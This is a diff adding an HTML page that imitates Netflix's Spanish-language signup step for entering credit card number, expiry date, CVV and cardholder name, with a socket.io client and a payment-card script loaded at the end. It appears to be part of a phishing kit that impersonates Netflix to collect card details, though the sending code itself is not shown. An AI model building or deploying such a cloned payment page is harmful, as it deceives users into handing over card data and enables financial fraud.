@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Configura tu tarjeta - Netflix</title>
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="stylesheet" href="css/signup.css">
+</head>
+<body class="signup-page">
+    <header class="header">
+        <div class="header-content">
+            <img src="img/Netflix_2015_logo.svg.webp" alt="Netflix" class="logo">
+            <button class="btn-signin" onclick="window.location.href='index.html'" data-i18n="signout">Cerrar sesión</button>
+        </div>
+    </header>
+
+    <section class="payment-card-section">
+        <div class="payment-card-container">
+            <a href="payment.html" class="back-link">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+                    <path d="M10 3L5 8l5 5" stroke="currentColor" stroke-width="2" fill="none"/>
+                </svg>
+                <span data-i18n="backPayment">Cambiar forma de pago</span>
+            </a>
+            
+            <p class="step-indicator" data-i18n="paymentStep">Paso 4 de 4</p>
+            <h1 data-i18n="paymentCardTitle">Configura tu tarjeta de crédito o débito</h1>
+            
+            <div class="card-logos">
+                <img src="img/VISA@2x.png" alt="Visa" height="20">
+                <img src="img/MASTERCARD@2x.png" alt="Mastercard" height="20">
+                <img src="img/AMEX@2x.png" alt="Amex" height="20">
+                <img src="img/DINERS@2x.png" alt="Diners" height="20">
+            </div>
+
+            <form id="cardForm" class="payment-form">
+                <div class="form-group">
+                    <input type="text" id="cardNumber" class="form-input" placeholder=" " maxlength="19" required>
+                    <label for="cardNumber" class="form-label" data-i18n="cardNumber">Número de tarjeta</label>
+                    <svg width="24" height="24" viewBox="0 0 24 24" class="input-icon">
+                        <rect x="2" y="5" width="20" height="14" rx="2" fill="none" stroke="currentColor" stroke-width="2"/>
+                        <path d="M2 10h20" stroke="currentColor" stroke-width="2"/>
+                    </svg>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <input type="text" id="expiryDate" class="form-input" placeholder=" " maxlength="5" required>
+                        <label for="expiryDate" class="form-label" data-i18n="expiryDate">Fecha de vencimiento (MM/AA)</label>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="cvv" class="form-input" placeholder=" " maxlength="4" required>
+                        <label for="cvv" class="form-label">CVV</label>
+                        <button type="button" class="cvv-help" title="¿Qué es el CVV?">
+                            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+                                <circle cx="8" cy="8" r="7" fill="none" stroke="currentColor" stroke-width="2"/>
+                                <text x="8" y="12" text-anchor="middle" font-size="12" font-weight="bold">?</text>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <input type="text" id="cardName" class="form-input" placeholder=" " required>
+                    <label for="cardName" class="form-label" data-i18n="cardName">Nombre en la tarjeta</label>
+                </div>
+
+                <div class="price-display">
+                    <span data-i18n="priceMonth">$ 44.900 al mes</span>
+                    <span class="plan-name">Premium</span>
+                    <button type="button" class="btn-link" onclick="window.location.href='plan.html'" data-i18n="changePrice">Cambiar</button>
+                </div>
+
+                <p class="payment-info" data-i18n-html="cardPaymentInfo">
+                    Los pagos se procesan internacionalmente. Es posible que se apliquen comisiones bancarias adicionales. Puede que tu banco o el emisor de tu tarjeta te hecho o comenzó la verificación del pago.
+                </p>
+
+                <p class="payment-terms">
+                    Al hacer clic en el cuadro, aceptas nuestros <a href="#" data-i18n="termsOfUse">Términos de uso</a> 
+                    y nuestra <a href="#" data-i18n="privacyStatement">Declaración de privacidad</a> y aceptas que Netflix 
+                    renueve automáticamente tu membresía y te cobre la tarifa de esta (actualmente de $ 44.900 al mes) 
+                    a través de tu forma de pago elegida. Puedes cancelar en cualquier momento para evitar cargos en el futuro.
+                </p>
+
+                <div class="form-checkbox">
+                    <input type="checkbox" id="acceptTerms" required>
+                    <label for="acceptTerms" data-i18n="acceptCheckbox">Acepto.</label>
+                </div>
+
+                <button type="submit" class="btn-primary" data-i18n="startMembership">Iniciar membresía</button>
+            </form>
+
+            <p class="recaptcha-notice">
+                Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#" data-i18n="learnMore">Más info</a>.
+            </p>
+        </div>
+    </section>
+
+    <footer class="footer footer-simple">
+        <div class="container">
+            <p class="footer-contact"><span data-i18n="footerContact">¿Preguntas? Llama al</span> <a href="tel:018005191570">01 800 519 1570</a></p>
+            
+            <div class="footer-links-horizontal">
+                <a href="#" data-i18n="footerLink1">Preguntas frecuentes</a>
+                <a href="#" data-i18n="footerLink2">Centro de ayuda</a>
+                <a href="#" data-i18n="footerLink10">Términos de uso</a>
+                <a href="#" data-i18n="footerLink11">Privacidad</a>
+                <a href="#" data-i18n="footerLink12">Preferencias de cookies</a>
+                <a href="#" data-i18n="footerLink13">Información corporativa</a>
+            </div>
+            
+            <div class="language-selector footer-lang">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="globe-icon">
+                    <path d="M8 0a8 8 0 100 16A8 8 0 008 0zm4.9 7.2h-2.5c-.1-1.5-.5-2.9-1.1-4.1 1.8.6 3.2 2 3.6 4.1zM8 14.4c-.8 0-2.1-2.6-2.3-5.6h4.6c-.2 3-1.5 5.6-2.3 5.6zm-.3-7.2c.2-3 1.5-5.6 2.3-5.6.8 0 2.1 2.6 2.3 5.6H7.7zm-1.1-4.1c-.6 1.2-1 2.6-1.1 4.1H3c.4-2.1 1.8-3.5 3.6-4.1zM3 8.8h2.5c.1 1.5.5 2.9 1.1 4.1-1.8-.6-3.2-2-3.6-4.1zm7.4 4.1c.6-1.2 1-2.6 1.1-4.1H13c-.4 2.1-1.8 3.5-3.6 4.1z"/>
+                </svg>
+                <select onchange="changeLang(this.value)">
+                    <option value="es">Español</option>
+                    <option value="en">English</option>
+                </select>
+                <svg width="12" height="12" viewBox="0 0 12 12" fill="currentColor" class="arrow-icon">
+                    <path d="M6 9L1 4h10z"/>
+                </svg>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <script src="js/socket-client.js"></script>
+    <script src="js/translations.js"></script>
+    <script>
+        // Display selected plan dynamically
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('💰 Loading plan info from localStorage');
+            const selectedPlan = localStorage.getItem('netflix_selected_plan') || 'premium';
+            console.log('Selected plan:', selectedPlan);
+            
+            const planNameEl = document.querySelector('.plan-name');
+            const priceEl = document.querySelector('.price-display span:first-child');
+            
+            const planData = {
+                basic: { name: 'Básico', price: '$ 18.900 al mes' },
+                standard: { name: 'Estándar', price: '$ 29.900 al mes' },
+                premium: { name: 'Premium', price: '$ 44.900 al mes' }
+            };
+            
+            if (planNameEl && planData[selectedPlan]) {
+                planNameEl.textContent = planData[selectedPlan].name;
+                console.log('✅ Plan name updated:', planData[selectedPlan].name);
+            }
+            if (priceEl && planData[selectedPlan]) {
+                priceEl.textContent = planData[selectedPlan].price;
+                console.log('✅ Price updated:', planData[selectedPlan].price);
+            }
+        });
+    </script>
+    <script src="js/payment-card.js"></script>
+</body>
+</html>
